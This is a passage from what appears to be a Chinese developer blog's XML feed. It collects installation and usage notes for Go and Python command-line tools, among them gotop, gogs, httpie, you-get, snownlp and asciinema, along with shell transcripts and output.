    <content type="text"><![CDATA[安装go12345678910111213141516171819202122232425yum install -y go[root@VM_0_14_centos shadowsocks]# go versiongo version go1.9.4 linux/amd64[root@VM_0_14_centos shadowsocks]# go envGOARCH="amd64"GOBIN=""GOEXE=""GOHOSTARCH="amd64"GOHOSTOS="linux"GOOS="linux"GOPATH="/root/go"GORACE=""GOROOT="/usr/lib/golang"GOTOOLDIR="/usr/lib/golang/pkg/tool/linux_amd64"GCCGO="gccgo"CC="gcc"GOGCCFLAGS="-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build058581188=/tmp/go-build -gno-record-gcc-switches"CXX="g++"CGO_ENABLED="1"CGO_CFLAGS="-g -O2"CGO_CPPFLAGS=""CGO_CXXFLAGS="-g -O2"CGO_FFLAGS="-g -O2"CGO_LDFLAGS="-g -O2"PKG_CONFIG="pkg-config" 百度网盘客户端12345678910go get -u https://github.com/iikira/BaiduPCS-GoBaiduPCS-Go update# 搜索根目录的文件BaiduPCS-Go search -path=/ 关键字# 搜索当前工作目录的文件BaiduPCS-Go search 关键字# 递归搜索当前工作目录的文件BaiduPCS-Go search -r 关键字 简单图床 AUXPI123456789101112131415161718192021cd $GOPATH/srcgit clone git@github.com:aimerforreimu/AUXPI.gitcd AUXPI/go get -u github.com/beego/bee$ bee run auxpi______| ___ \| |_/ / ___ ___| ___ \ / _ \ / _ \| |_/ /| __/| __/\____/ \___| \___| v1.10.02018/11/08 19:53:08 INFO ▶ 0001 Using 'auxpi' as 'appname'2018/11/08 19:53:08 INFO ▶ 0002 Initializing watcher...auxpi/routersauxpi2018/11/08 19:53:25 SUCCESS ▶ 0003 Built Successfully!2018/11/08 19:53:25 INFO ▶ 0004 Restarting 'auxpi.exe'...2018/11/08 19:53:25 SUCCESS ▶ 0005 './auxpi.exe' is running...2018/11/08 19:53:25.404 [I] [parser.go:96] generate router from comments2018/11/08 19:53:25.407 [I] [parser.go:96] generate router from comments2018/11/08 19:53:25.460 [I] [asm_amd64.s:1333] http server Running on http://:2333 基于终端的图形活动监视器123456git clone --depth 1 https://github.com/cjbassi/gotop /tmp/gotopsh /tmp/gotop/scripts/download.shmv gotop /usr/local/bingo get github.com/cjbassi/gotop# 直接执行gotop 下载视频123456789101112131415161718192021go get -u github.com/iawia002/annie$ annie -i https://www.bilibili.com/video/av21877586 https://www.bilibili.com/video/av21990740 Site: 哔哩哔哩 bilibili.com Title: 【莓机会了】甜到虐哭的13集单集MAD「我现在什么都不想干,更不想看14集」 Type: video Streams: # All available quality [default] ------------------- Quality: 高清 1080P Size: 51.88 MiB (54403767 Bytes) # download with: annie -f default "URL" Site: 哔哩哔哩 bilibili.com Title: 【莓救了】甜到虐哭！！！国家队单集MAD-当熟悉的bgm响起，眼泪从脸颊滑下 Type: video Streams: # All available quality [default] ------------------- Quality: 高清 1080P Size: 77.63 MiB (81404093 Bytes) # download with: annie -f default "URL" 跨平台的网络性能测量工具1234567go get github.com/Microsoft/ethr[root@VM_0_14_centos ~]# /root/go/bin/ethr -sListening on 9991 for control planeListening on 9996 for TCP latency testsListening on 9998 for TCP conn/s testsListening on 9999 for TCP bandwidth testsUnable to start HTTP server, so HTTP tests cannot be run: listen tcp :8080: bind: address already in use 海报生成器123456789101112131415161718git clone https://github.com/qbhy/poster-generater.gitcd poster-generatergo build[root@VM_0_14_centos poster-generater]# ./poster-generater 7877[GIN-debug] [WARNING] Now Gin requires Go 1.6 or later and Go 1.7 will be required soon.[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production. - using env: export GIN_MODE=release - using code: gin.SetMode(gin.ReleaseMode)[GIN-debug] GET /assets/*filepath --&gt; poster-generater/vendor/github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)[GIN-debug] HEAD /assets/*filepath --&gt; poster-generater/vendor/github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)[GIN-debug] POST /poster --&gt; main.main.func1 (3 handlers)[GIN-debug] Listening and serving HTTP on :7877[GIN] 2018/12/19 - 11:48:03 | 404 | 1.05µs | 218.30.113.34 | GET / HTTP(S)代理, 用于抓包调试123456docker run --name mars -p 8888:8888 -p 9999:9999 -d ouqg/mars:1.0.0wget https://github.com/ouqiang/mars/releases解压压缩包启动: ./mars server访问代理: http://localhost:8888查看流量web页: http://localhost:9999, 客户端可扫描二维码下载根证书 自助 Git 服务123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869sudo su - gitcd ~# create a folder to install 'go'mkdir local# Download go (change go$VERSION.$OS-$ARCH.tar.gz to the latest release)wget https://storage.googleapis.com/golang/go$VERSION.$OS-$ARCH.tar.gz# expand it to ~/localtar -C /home/git/local -xzf go$VERSION.$OS-$ARCH.tar.gzsudo su - gitcd ~echo 'export GOROOT=$HOME/local/go' &gt;&gt; $HOME/.bashrcecho 'export GOPATH=$HOME/go' &gt;&gt; $HOME/.bashrcecho 'export PATH=$PATH:$GOROOT/bin:$GOPATH/bin' &gt;&gt; $HOME/.bashrcsource $HOME/.bashrc# 下载并安装依赖$ go get -u github.com/gogs/gogs# 构建主程序$ cd $GOPATH/src/github.com/gogs/gogs$ go buildcd $GOPATH/src/github.com/gogs/gogs./gogs web -port 3001 &amp;2019/01/23 14:16:48 [ WARN] Custom config '/root/go/src/github.com/gogs/gogs/custom/conf/app.ini' not found, igng first time2019/01/23 14:16:48 [TRACE] Custom path: /root/go/src/github.com/gogs/gogs/custom2019/01/23 14:16:48 [TRACE] Log path: /root/go/src/github.com/gogs/gogs/log2019/01/23 14:16:48 [TRACE] Log Mode: Console (Trace)2019/01/23 14:16:48 [ INFO] Gogs 0.11.85.12252019/01/23 14:16:48 [ INFO] Cache Service Enabled2019/01/23 14:16:48 [ INFO] Session Service Enabled2019/01/23 14:16:48 [ INFO] Run Mode: Development2019/01/23 14:16:50 [ INFO] Listen: http://0.0.0.0:30002019/01/23 14:16:50 [FATAL] [...rfave/cli/command.go:193 Run()] Failed to start server: listen tcp 0.0.0.0:3000: use[root@VM_0_14_centos gogs]# lsof -i:3000COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEdocker-pr 3588 root 4u IPv6 29572 0t0 TCP *:hbci (LISTEN)修改端口 参考 https://gogs.io/docs/advanced/configuration_cheat_sheet.htmltouch custom/conf/app.inivi app.ini[server]HTTP_PORT = 6666nginx 反向代理 server &#123; listen 80; server_name git.crystalnetwork.us; location / &#123; proxy_pass http://localhost:3001; &#125;&#125;访问 http://118.24.158.116:3001/ 如果无法访问，可能是项目在root目录下的原因，重新设置gopath,重新go get和build λ shs root@118.24.158.116 PTY allocation request failed on channel 0 Hi there, You've successfully authenticated, but Gogs does not provide shell access. If this is unexpected, please log in with password and setup Gogs under another user. Connection to 118.24.158.116 closed. Mac平台下，进入~/.ssh目录，之前肯定有了一对密钥，公钥id_rsa.pub和私钥id_rsa。 使用命令生成新的一对密钥，切记要命名跟原来的密钥不同，ssh-keygen -t rsa -f gogs_id_rsa -C "xiong-wei@hotmail.com" 在.ssh目录中创建config文件，然后添加如下内容： Host 118.24.158.116 IdentityFile ~/.ssh/gogs_id_rsa IdentitiesOnly yes 切换 Git 分支12345678910go get -u github.com/royeo/git-checkout-branch如果你正在使用 GO1.11 Module，使用以下命令进行安装：GO111MODULE=off go get -u github.com/royeo/git-checkout-branch建议为 checkout-branch 设置别名，例如 cb，这样就可以直接使用 git cb 来进行分支切换。git config --global alias.cb checkout-branch帮助使用 git checkout-branch help 获取帮助信息。 命令行压缩和解压123456789101112go get -u github.com/mholt/archiver/cmd/arc$ arc archive test.tar.gz file1.txt images/file2.jpg folder/subfolder$ arc unarchive test.tar.gz$ arc ls caddy_dist.tar.gzdrwxr-xr-x matt staff 0 2018-09-19 15:47:18 -0600 MDT dist/-rw-r--r-- matt staff 6148 2017-08-07 18:34:22 -0600 MDT dist/.DS_Store-rw-r--r-- matt staff 22481 2018-09-19 15:47:18 -0600 MDT dist/CHANGES.txt-rw-r--r-- matt staff 17189 2018-09-19 15:47:18 -0600 MDT dist/EULA.txt-rw-r--r-- matt staff 25261 2016-03-07 16:32:00 -0700 MST dist/LICENSES.txt-rw-r--r-- matt staff 1017 2018-09-19 15:47:18 -0600 MDT dist/README.txt-rw-r--r-- matt staff 288 2016-03-21 11:52:38 -0600 MDT dist/gitcookie.sh.enc 生成可执行文件12345678910111213go get github.com/mitchellh/goxλ gox -hUsage: gox [options] [packages] Gox cross-compiles Go applications in parallel. If no specific operating systems or architectures are specified, Gox will build for all pairs supported by your version of Go git clone https://github.com/hezhizheng/go-movies [root@VM_0_11_centos go-movies]# gox -osarch="linux/amd64" Number of parallel builds: 1 --&gt; linux/amd64: go_movies Golang 新手教程：入门速成指南 go 语言优秀开源项目汇总 使用 go 的 gin 和 gorm 框架来构建 RESTful API 微服务 Golang 实现 PHP 常用内置函数 golang学习笔记 使用 Gogs 搭建自己的 Git 服务器 Go开源项目学习 go编码规范 自动生成Restful API文档 http代理工具 【Go学习笔记】2018-12-27 ss代理 一款极易搭建的自助 Git 服务 go教程 内网穿透的高性能的反向代理应用 监控报警系统 初学者的 Go 语言教程 一个简单高性能的 router Go 语言数据结构代码生成器 go-by-example go学习 去中心化数字资产闪兑平台 《 刻意学习 Golang 》 《Go语言四十二章经》 搭建并行处理管道，感受GO语言魅力 A global proxy for go modules The Central Go Modules Repository 程序员内功系列–常用命令行工具]]></content>
      <tags>
        <tag>命令行</tag>
        <tag>工具</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python命令行工具]]></title>
    <url>%2F2018%2F11%2F29%2FPython%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[安装python312345678910111213141516sudo yum install python34$ curl -O https://bootstrap.pypa.io/get-pip.py$ sudo /usr/bin/python3.4 get-pip.pyLooking in indexes: http://mirrors.tencentyun.com/pypi/simpleCollecting pip Downloading http://mirrors.tencentyun.com/pypi/packages/d8/f3/413bab4ff08e1fc4828dfc59996d721917df8e8583ea85385d51125dceff/pip-19.0.3-py2.py3-none-any.whl (1.4MB) 100% |████████████████████████████████| 1.4MB 2.9MB/sCollecting setuptools Downloading http://mirrors.tencentyun.com/pypi/packages/d1/6a/4b2fcefd2ea0868810e92d519dacac1ddc64a2e53ba9e3422c3b62b378a6/setuptools-40.8.0-py2.py3-none-any.whl (575kB) 100% |████████████████████████████████| 583kB 2.7MB/sCollecting wheel[root@CentOS72 ~]# python3 -VPython 3.4.3[root@su ~]# pip3 -Vpip 19.0.3 from /usr/lib/python3.4/site-packages/pip (python 3.4)https://blog.huzhifeng.com/2016/09/12/CentOS-7-Install-Python3-pip3/ 显示Python包123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123//pip包网站 https://pypi.org/search/?q=cheat//命令行安装目录 which httpstat /d/python/srcripts/pip install https://github.com/mher/flower/zipball/master$ pip listPackage Version-------------------- ---------aiohttp 3.4.4alembic 1.0.0amqp 2.3.2asn1crypto 0.24.0astral 1.6.1async-timeout 3.0.0attrs 18.2.0Automat 0.7.0Babel 2.6.0bcrypt 3.1.4billiard 3.5.0.4bleach 2.1.4boto3 1.4.7botocore 1.7.48cchardet 2.1.4celery 4.2.1certifi 2018.8.24cffi 1.11.5chardet 3.0.4click 6.7colorama 0.3.9constantly 15.1.0contextlib2 0.5.5cryptography 2.3.1defusedxml 0.5.0docutils 0.14et-xmlfile 1.0.1Flask 0.12.4Flask-AppBuilder 1.12.1Flask-Babel 0.11.1Flask-Caching 1.4.0Flask-Compress 1.4.0Flask-Login 0.4.1Flask-Migrate 2.2.1Flask-OpenID 1.2.5Flask-Script 2.0.6Flask-SQLAlchemy 2.3.2Flask-Testing 0.7.1Flask-WTF 0.14.2flower 0.9.2future 0.16.0geographiclib 1.49geopy 1.16.0gunicorn 19.9.0homeassistant 0.80.3html5lib 1.0.1humanize 0.5.1hyperlink 18.0.0idna 2.7ijson 2.3incremental 17.5.0isodate 0.6.0itsdangerous 0.24jdcal 1.4Jinja2 2.10jmespath 0.9.3jsonlines 1.2.0jsonschema 2.6.0kombu 4.2.1linear-tsv 1.1.0Mako 1.0.7Markdown 3.0.1MarkupSafe 1.0multidict 4.4.2mysqlclient 1.3.13numpy 1.15.1openpyxl 2.4.11pandas 0.23.4parsedatetime 2.4pathlib2 2.3.2pip 18.1polyline 1.3.2pure-sasl 0.5.1pycparser 2.18pydruid 0.4.5PyHamcrest 1.9.0PyHive 0.6.0PyJWT 1.6.4PyMySQL 0.9.2python-dateutil 2.7.3python-editor 1.0.3python-geohash 0.8.5python3-openid 3.1.0pytz 2018.5PyYAML 3.13requests 2.19.1rfc3986 1.1.0s3transfer 0.1.13selenium 3.14.0setuptools 39.0.1simplejson 3.16.0six 1.11.0SQLAlchemy 1.2.11SQLAlchemy-Utils 0.33.3sqlparse 0.2.4superset 0.28.0tableschema 1.2.5tabulator 1.17.0thrift 0.11.0thrift-sasl 0.3.0tornado 5.1Twisted 18.9.0unicodecsv 0.14.1Unidecode 1.0.22urllib3 1.23vine 1.1.4virtualenv 16.0.0voluptuous 0.11.5voluptuous-serialize 2.0.0webencodings 0.5.1Werkzeug 0.14.1wheel 0.32.1WTForms 2.2.1xlrd 1.1.0yarl 1.2.6youtube-dl 2018.10.5zope.interface 4.5.0 视频下载you-get1234567891011121314151617181920212223242526272829303132333435363738//https://github.com/soimort/you-get$ you-get 'https://www.youtube.com/watch?v=jNQXAC9IVRw'site: YouTubetitle: Me at the zoostream: - itag: 43 container: webm quality: medium size: 0.5 MiB (564215 bytes) # download-with: you-get --itag=43 [URL]Downloading Me at the zoo.webm ... 100% ( 0.5/ 0.5MB) ├██████████████████████████████████┤[1/1] 6 MB/sSaving Me at the zoo.en.srt ... Done.$ you-get https://stallman.org/rms.jpgSite: stallman.orgTitle: rmsType: JPEG Image (image/jpeg)Size: 0.06 MiB (66482 Bytes)Downloading rms.jpg ...100.0% ( 0.1/0.1 MB) ├████████████████████████████████████████┤[1/1] 127 kB/s$ pip3 install -U lulu$ lulu https://www.bilibili.com/video/av18295259/site: Bilibilititle: 【中文八级】俄罗斯人的名字超乎你的想象stream: - format: flv720 container: flv size: 175.4 MiB (183914793 bytes) # download-with: lulu --format=flv720 [URL]Downloading 【中文八级】俄罗斯人的名字超乎你的想象.flv ... 100% (175.4/175.4MB) ├████████████████████████████████████████┤[1/1] 3 MB/sDownloading 【中文八级】俄罗斯人的名字超乎你的想象.cmt.xml ... httpie123456789101112131415161718192021222324252627282930313233343536373839404142434445464748pip install --upgrade httpiehttp httpie.orgHTTP/1.1 301 Moved PermanentlyCF-RAY: 486fc237347a7948-LAXCache-Control: max-age=3600Connection: keep-aliveDate: Mon, 10 Dec 2018 12:36:42 GMTExpires: Mon, 10 Dec 2018 13:36:42 GMTLocation: https://httpie.org/Server: cloudflareTransfer-Encoding: chunkedVary: Accept-Encoding$ http PUT example.org X-API-Token:123 name=John$ http DELETE example.org/todos/7$docker pull kennethreitz/httpbin$docker run -p 80:80 kennethreitz/httpbinhttp tonydeng.github.io/blog/2015/07/10/httpie-howto/ User-Agent:Xmodlo/1.0 Referer:http://tonydeng.github.ioGET /blog/2015/07/10/httpie-howto/ HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateConnection: keep-aliveHost: tonydeng.github.ioReferer: http://tonydeng.github.ioUser-Agent: Xmodlo/1.0http PUT tonydeng.github.io name='Tony Deng' email='tonydeng@email.com'http -f POST tonydeng.github.io name='Tony Deng' email='tonydeng@email.com'-f 选项使http命令序列化数据字段，并将Content-Type设置为application/x-www-form-urlencoded;charset=utf-8当你不指定Content-Type发送请求参数时，它们就会自动序列化为JSON对象。https://tonydeng.github.io/2015/07/10/httpie-howto/http POST tonydeng.github.io name='Tony Deng' email='tonydeng@email.com'POST / HTTP/1.1Accept: application/jsonAccept-Encoding: gzip, deflateConnection: keep-aliveContent-Length: 52Content-Type: application/jsonHost: tonydeng.github.ioUser-Agent: HTTPie/0.9.2&#123; "email": "tonydeng@email.com", "name": "Tony Deng"&#125;http POST tonydeng.github.io &lt; my_info.json或:echo '&#123;"name": "Tony Deng","email": "tonydeng@email.com"&#125;' | http POST tonydeng.github.io 清晰易读的 cURL 工具httpstat12345678910111213141516171819202122232425262728pip install httpstatwget https://raw.githubusercontent.com/reorx/httpstat/master/httpstat.py go get github.com/davecheney/httpstat https://learnku.com/articles/24048$ httpstat httpbin.orgConnected to 54.152.127.232:80 from 10.235.51.43:55118HTTP/1.1 200 OKConnection: keep-aliveServer: gunicorn/19.9.0Date: Mon, 10 Dec 2018 12:39:33 GMTContent-Type: text/html; charset=utf-8Content-Length: 10122Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: trueVia: 1.1 vegurBody stored in: C:\Users\suping3\AppData\Local\Temp\tmppkgeite_ DNS Lookup TCP Connection Server Processing Content Transfer[ 250ms | 234ms | 265ms | 15ms ] | | | | namelookup:250ms | | | connect:484ms | | starttransfer:749ms | total:764mshttpstat httpbin.org/post -X POST --data-urlencode "a=b" -v https://wi1dcard.cn/posts/easier-curl-with-colors/ shadowsocks12345pip install shadowsocksssserver -p 443 -k password -m rc4-md5sudo ssserver -p 443 -k password -m rc4-md5 --user nobody -d startsudo ssserver -d stop less /var/log/shadowsocks.log 增强型语法高亮mycli1mycli -u用户名 -p密码 中文分词12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from snownlp import SnowNLPs = SnowNLP(u'这个东西真心很赞')s.words # [u'这个', u'东西', u'真心', # u'很', u'赞']s.tags # [(u'这个', u'r'), (u'东西', u'n'), # (u'真心', u'd'), (u'很', u'd'), # (u'赞', u'Vg')]s.sentiments # 0.9769663402895832 positive的概率s.pinyin # [u'zhe', u'ge', u'dong', u'xi', # u'zhen', u'xin', u'hen', u'zan']s = SnowNLP(u'「繁體字」「繁體中文」的叫法在臺灣亦很常見。')s.han # u'「繁体字」「繁体中文」的叫法 # 在台湾亦很常见。'text = u'''自然语言处理是计算机科学领域与人工智能领域中的一个重要方向。它研究能实现人与计算机之间用自然语言进行有效通信的各种理论和方法。自然语言处理是一门融语言学、计算机科学、数学于一体的科学。因此，这一领域的研究将涉及自然语言，即人们日常使用的语言，所以它与语言学的研究有着密切的联系，但又有重要的区别。自然语言处理并不是一般地研究自然语言，而在于研制能有效地实现自然语言通信的计算机系统，特别是其中的软件系统。因而它是计算机科学的一部分。'''s = SnowNLP(text)s.keywords(3) # [u'语言', u'自然', u'计算机']s.summary(3) # [u'因而它是计算机科学的一部分', # u'自然语言处理是一门融语言学、计算机科学、 # 数学于一体的科学', # u'自然语言处理是计算机科学领域与人工智能 # 领域中的一个重要方向']s.sentencess = SnowNLP([[u'这篇', u'文章'], [u'那篇', u'论文'], [u'这个']])s.tfs.idfs.sim([u'文章'])# [0.3756070762985226, 0, 0] 测试你的上下行网速123456789101112pip install speedtest-cli --upgrade[root@VM_0_14_centos ~]# speedtest --shareRetrieving speedtest.net configuration...Testing from Tencent cloud computing (118.24.158.116)...Retrieving speedtest.net server list...Selecting best server based on ping...Hosted by Beijing Broadband Network (Beijing) [1.69 km]: 36.987 msTesting download speed................................................................................Download: 21.77 Mbit/sTesting upload speed................................................................................................Upload: 1.10 Mbit/sShare results: http://www.speedtest.net/result/7842317337.png cheat12345678910111213141516171819202122232425262728293031323334353637383940414243444546pip install cheat$ cheat curl# Download a single filecurl http://path.to.the/file# Download a file and specify a new filenamecurl http://example.com/file.zip -o new_file.zip# Download multiple filescurl -O URLOfFirstFile -O URLOfSecondFile# Download all sequentially numbered files (1-24)curl http://example.com/pic[1-24].jpg# Download a file and pass HTTP Authenticationcurl -u username:password URL# Download a file with a Proxycurl -x proxysever.server.com:PORT http://addressiwantto.access# Download a file from FTPcurl -u username:password -O ftp://example.com/pub/file.zip# Get an FTP directory listingcurl ftp://username:password@example.com# Resume a previously failed downloadcurl -C - -o partial_file.zip http://example.com/file.zip# Fetch only the HTTP headers from a responsecurl -I http://example.com# Fetch your external IP and network info as JSONcurl http://ifconfig.me/all/json# Limit the rate of a downloadcurl --limit-rate 1000B -O http://path.to.the/file# Get your global IPcurl httpbin.org/ip# Get only the HTTP status codecurl -o /dev/null -w '%&#123;http_code&#125;\n' -s -I URLcurl cht.sh/curlcurl cht.sh/php/array_map zhihu123456789101112131415161718192021222324252627$ pip install zhihuapiimport zhihuapi as apiwith open('cookie') as f: api.cookie(f.read())data = api.user('zhihuadmin').profile()print(data)&#123; "url_token": "zhihuadmin", "avatar_url": "https://pic3.zhimg.com/34bf96bf5584ac4b5264bd7ed4fdbc5a_is.jpg", "avatar_url_template": "https://pic3.zhimg.com/34bf96bf5584ac4b5264bd7ed4fdbc5a_&#123;size&#125;.jpg", "type": "people", "name": "知乎小管家", "headline": "欢迎反馈问题和建议！", "is_org": false, "url": "https://www.zhihu.com/people/zhihuadmin", "badge": [ &#123; "type": "identity", "description": "知乎官方帐号" &#125; ], "user_type": "people", "is_advertiser": false, "id": "3d198a56310c02c4a83efb9f4a4c027e"&#125; 微信机器人123456789101112131415161718192021222324252627pip install -U wxpy -i "https://pypi.doubanio.com/simple/"# 导入模块from wxpy import *# 初始化机器人，扫码登陆bot = Bot()# 搜索名称含有 "游否" 的男性深圳好友my_friend = bot.friends().search('游否', sex=MALE, city="深圳")[0]# 发送文本给好友my_friend.send('Hello WeChat!')# 发送图片my_friend.send_image('my_picture.jpg')pip install wechat_senderfrom wxpy import *from wechat_sender import *bot = Bot()listen(bot)# 之后 wechat_sender 将持续运行等待接收外部消息from wechat_sender import SenderSender().send('Hello From Wechat Sender')# Hello From Wechat Sender 这条消息将通过 1 中登录微信的文件助手发送给你pip install itchatimport itchatitchat.auto_login()itchat.send('Hello, filehelper', toUserName='filehelper') 数据可视化1234567891011121314151617# Install supersetpip install superset# Create an admin user (you will be prompted to set a username, first and last name before setting a password)fabmanager create-admin --app superset# Initialize the databasesuperset db upgrade# Load some data to play withsuperset load_examples# Create default roles and permissionssuperset init# To start a development web server on port 8088, use -p to bind to another portsuperset runserver -d 直接执行简单 Python 表达式1234567891011121314[root@VM_0_14_centos onpremise]# pip install pythonpyCollecting pythonpy Downloading http://mirrors.tencentyun.com/pypi/packages/01/ca/3b2c0fe88b4305dcaa2c575046781338add06e5670e3baf13a378e3acbd4/pythonpy-0.4.11.tar.gzInstalling collected packages: pythonpy Running setup.py install for pythonpy ... doneSuccessfully installed pythonpy-0.4.11You are using pip version 8.1.2, however version 18.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.[root@VM_0_14_centos onpremise]# py "248168/1024.0"242.3515625$ py "pandas.__version__"0.16.2$ py 'math.exp(1)'2.71828182846 ppt 转 pdf 图片123456789101112131415pip install PyWin32 Pillow reportlab git clone https://github.com/ernestyao/PPT2PDF.git C:\PPT2PDF-master&gt;python PPT2PDF.py test.pptx test.pdf test 水印完成 准备生成C:\PPT2PDF-master\test_tank测试.pdf C:\PPT2PDF-master\test_tank测试\幻灯片1.PNG C:\PPT2PDF-master\test_tank测试\幻灯片2.PNG C:\PPT2PDF-master\test_tank测试\幻灯片3.PNG C:\PPT2PDF-master\test_tank测试\幻灯片4.PNG C:\PPT2PDF-master\test_tank测试\幻灯片5.PNG C:\PPT2PDF-master\test_tank测试\幻灯片6.PNG C:\PPT2PDF-master\test_tank测试\幻灯片7.PNG C:\PPT2PDF-master\test_tank测试\幻灯片8.PNG 完成PDF合成 http://blog.51yip.com/other/1934.html 二维码12345678# 逐一安装https://yfzhou.coding.me/2018/08/27/%E4%BD%BF%E7%94%A8-Python-%E7%94%9F%E6%88%90%E4%BA%8C%E7%BB%B4%E7%A0%81/pip install pillowpip install numpypip install imageiopip install myqrmyqr https://github.com -p github.jpg -cmyqr https://github.com -p github.gif -c -con 1.5 -bri 1.6 数据分析1234567pip3 install pandaspython3 -m pip install --upgrade pippython3 -m pip install jupyterjupyter notebookcopy and paste one of these URLs: http://localhost:8889/?token=3907c3efc88d7814cf8cfee262ad277d8cf8ae2c7cf97b8d[I 13:51:10.834 NotebookApp] Creating new notebook in uncurl12345678910111213141516171819202122Python Requests转换助手有一个很棒的开源cURL http://curl.trillworks.com https://github.com/NickCarneiro/curlconverterpip install uncurl [root@su ~]# uncurl "curl 'https://pypi.python.org/pypi/uncurl' -H 'Accept-Encoding: gzip,deflate,sdch'"requests.get("https://pypi.python.org/pypi/uncurl", headers=&#123; "Accept-Encoding": "gzip,deflate,sdch" &#125;, cookies=&#123;&#125;,)echo "curl 'https://pypi.python.org/pypi/uncurl' -H 'Accept-Encoding: gzip,deflate,sdch'"|uncurlimport uncurl&gt;&gt;&gt; print(uncurl.parse("curl 'https://pypi.python.org/pypi/uncurl' -H 'Accept-Encoding: gzip,deflate,sdch'"))requests.get("https://pypi.python.org/pypi/uncurl", headers=&#123; "Accept-Encoding": "gzip,deflate,sdch" &#125;, cookies=&#123;&#125;,)https://stackoverflow.com/questions/20461194/conversion-of-curl-to-python-requests中文版stackoverflow http://landcareweb.com/questions/35099/jiang-curlzhuan-huan-wei-pythonqing-qiu 词云12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ wordcloud_cli --text mytext.txt --imagefile wordcloud.pngIf you're dealing with PDF files, then pdftotext, included by default with many Linux distribution, comes in handy:$ pdftotext mydocument.pdf - | wordcloud_cli --imagefile wordcloud.pngwordcloud_cli --text in.txt --imagefile out.png --mask in.pngtext 是词云来源，mask 是背景框架 ，imagefile 输出的文件wordcloud_cli.exe --text datas\data.json --fontfile assets\simkai.ttf --imagefile wordcloud.pngwordcloud_cli --help 查看所有支持的命令参数usage: wordcloud_cli [-h] [--text file] [--regexp regexp] [--stopwords file] [--imagefile file] [--fontfile path] [--mask file] [--colormask file] [--contour_width width] [--contour_color color] [--relative_scaling rs] [--margin width] [--width width] [--height height] [--color color] [--background color] [--no_collocations] [--version]A simple command line interface for wordcloud module.optional arguments: -h, --help show this help message and exit --text file specify file of words to build the word cloud (default: stdin) --regexp regexp override the regular expression defining what constitutes a word --stopwords file specify file of stopwords (containing one word per line) to remove from the given text after parsing --imagefile file file the completed PNG image should be written to (default: stdout) --fontfile path path to font file you wish to use (default: DroidSansMono) --mask file mask to use for the image form --colormask file color mask to use for image coloring --contour_width width if greater than 0, draw mask contour (default: 0) --contour_color color use given color as mask contour color - accepts any value from PIL.ImageColor.getcolor --relative_scaling rs scaling of words by frequency (0 - 1) --margin width spacing to leave around words --width width define output image width --height height define output image height --color color use given color as coloring for the image - accepts any value from PIL.ImageColor.getcolor --background color use given color as background color for the image - accepts any value from PIL.ImageColor.getcolor --no_collocations do not add collocations (bigrams) to word cloud (default: add unigrams and bigrams) --version show program's version number and exit 命令行录制工具asciinema123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112pip3 install asciinemahttps://asciinema.org/docs/installationasciinema rec录制完成 ctrl+d 或 exit 退出，可保存到本地（json 格式），也可上传到 https://asciinema.org ，设置为 public 后可分享观看，而且官方提供多种方式很容易嵌入到自己对网站使用。https://asciinema.org/a/248319?t=5&amp;speed=3&amp;theme=solarized-dark视频链接后加 .png 对应的是分享用的视频截图：https://asciinema.org/a/248319.png ，而视频链接后加 .js 是可以站外直接调用的播放链接：&lt;script src="https://asciinema.org/a/113463.js" id="asciicast-113463" async data-autoplay="true" data-size="big"&gt;&lt;/script&gt;https://learnku.com/articles/28920[root@VM_0_14_centos ~]# asciinema recasciinema: recording asciicast to /tmp/tmpc_o6vho1-ascii.castasciinema: press &lt;ctrl-d&gt; or type "exit" when you're done[root@VM_0_14_centos ~]# pip listDEPRECATION: Python 3.4 support has been deprecated. pip 19.1 will be the last one supporting it. Please upgrade your Python as Python 3.4 won't be maintained after March 2019 (cf PEP 429).Package Version---------------- -----------argh 0.26.2arrow 0.13.2asciinema 2.0.2asn1crypto 0.24.0backports-abc 0.5beautifulsoup4 4.7.1binaryornot 0.4.4blinker 1.4brotlipy 0.7.0certifi 2019.3.9cffi 1.12.2chardet 3.0.4click 6.7configparser 3.7.3cookiecutter 1.6.0cryptography 2.3.1curlify 2.1.1future 0.17.1graphviz 0.8.4greenlet 0.4.15h11 0.7.0h2 3.1.0hiredis 1.0.0hpack 3.0.0hyperframe 5.2.0idna 2.8Jinja2 2.10.1jinja2-time 0.2.0kaitaistruct 0.8ldap3 2.5.2MarkupSafe 1.1.1mitmproxy 4.0.4msgpack 0.6.1mxnet-cu90 1.4.0.post0numpy 1.14.6passlib 1.7.1pathtools 0.1.2peewee 3.9.2pip 19.0.3poyo 0.4.2pyasn1 0.4.5pycparser 2.19pyOpenSSL 18.0.0pyparsing 2.2.2pyperclip 1.6.5python-dateutil 2.8.0pytz 2018.9PyYAML 5.1redis 3.2.1requests 2.21.0ruamel.yaml 0.15.91setuptools 40.8.0six 1.12.0sortedcontainers 2.0.5soupsieve 1.8thrift 0.11.0tornadis 0.8.1tornado 5.1torthrift 0.2.4tzlocal 1.5.1uncurl 0.0.8urllib3 1.24.1urwid 2.0.1watchdog 0.9.0wheel 0.33.1when-changed 0.3.0whichcraft 0.5.2wsproto 0.11.0xerox 0.4.1you-get 0.4.1256zdict 2.0.4You are using pip version 19.0.3, however version 19.1.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.[root@VM_0_14_centos ~]# php -vPHP 7.2.3 (cli) (built: Nov 28 2018 12:05:00) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.2.0, Copyright (c) 1998-2018 